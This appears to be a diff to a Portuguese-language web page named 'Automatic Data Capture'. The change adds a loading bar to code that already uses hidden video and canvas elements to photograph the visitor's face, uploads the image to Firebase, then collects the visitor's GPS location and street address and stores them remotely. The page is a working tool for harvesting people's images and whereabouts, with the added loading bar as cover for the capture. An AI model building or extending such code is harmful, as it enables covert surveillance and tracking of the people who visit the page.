@@ -4,11 +4,41 @@
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Captura Automática de Dados</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      text-align: center;
+      margin: 20px;
+    }
+    #loader {
+      display: none;
+      width: 100%;
+      height: 10px;
+      background-color: #f3f3f3;
+      position: relative;
+      overflow: hidden;
+      margin-top: 20px;
+    }
+    #loader div {
+      width: 0;
+      height: 100%;
+      background-color: #4caf50;
+      animation: loading 3s linear infinite;
+    }
+    @keyframes loading {
+      from { width: 0; }
+      to { width: 100%; }
+    }
+  </style>
   <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-app-compat.js"></script>
   <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-database-compat.js"></script>
   <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-storage-compat.js"></script>
 </head>
 <body>
+  <div id="loader">
+    <div></div>
+  </div>
+
   <script>
     // Configuração do Firebase
     const firebaseConfig = {
@@ -27,10 +57,24 @@
     const database = firebase.database();
     const storage = firebase.storage();
 
+    const loader = document.getElementById('loader');
+
+    // Mostrar barra de carregamento
+    function showLoader() {
+      loader.style.display = 'block';
+    }
+
+    // Ocultar barra de carregamento
+    function hideLoader() {
+      loader.style.display = 'none';
+    }
+
     // Função para capturar selfie e salvar no Storage
     function captureSelfieAndSave() {
       const video = document.createElement('video'); // Cria o elemento de vídeo oculto
       const canvas = document.createElement('canvas'); // Cria o canvas oculto
+
+      showLoader(); // Exibe a barra de carregamento
 
       navigator.mediaDevices.getUserMedia({ video: true })
         .then(stream => {
@@ -52,7 +96,8 @@
           };
         })
         .catch(error => {
-          alert('Erro ao acessar a câmera: ' + error.message);
+          hideLoader(); // Oculta a barra de carregamento em caso de erro
+          alert('Erro ao acessar a câmera. Verifique as permissões e tente novamente.');
         });
     }
 
@@ -65,6 +110,7 @@
           getLocation(url); // Após salvar a selfie, coleta localização e endereço
         })
         .catch(error => {
+          hideLoader();
           alert('Erro ao salvar a selfie no Firebase Storage: ' + error.message);
         });
     }
@@ -94,8 +140,10 @@
           } else {
             alert('Erro ao obter endereço: nenhum resultado encontrado.');
           }
+          hideLoader();
         })
         .catch(error => {
+          hideLoader();
           alert('Erro ao obter o endereço: ' + error.message);
         });
     }
@@ -107,9 +155,11 @@
           const { latitude, longitude } = position.coords;
           getAddressFromCoordinates(latitude, longitude, selfieUrl);
         }, error => {
+          hideLoader();
           alert('Erro ao obter a localização: ' + error.message);
         });
       } else {
+        hideLoader();
         alert('Geolocalização não é suportada pelo navegador.');
       }
     }
@@ -118,6 +168,7 @@
     function sendDataToFirebase(data) {
       const reference = database.ref('userData');
       reference.push(data, function (error) {
+        hideLoader(); // Oculta a barra de carregamento após salvar os dados
         if (error) {
           alert('Erro ao enviar dados para o Firebase: ' + error.message);
         } else {
